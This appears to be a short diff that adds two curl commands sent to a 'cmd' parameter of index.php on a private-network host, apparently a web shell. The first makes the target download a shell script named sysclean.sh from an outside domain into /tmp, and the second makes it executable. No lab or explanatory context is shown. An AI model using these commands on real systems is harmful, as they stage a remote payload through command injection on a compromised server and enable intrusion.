@@ -1,0 +1,3 @@
+curl "http://10.0.0.190/index.php?cmd=wget%20https://www.glyphforge.net/junk/sysclean.sh%20-O%20/tmp/sysclean.sh"
+
+curl "http://10.0.0.190/index.php?cmd=chmod%20755%20/tmp/sysclean.sh"
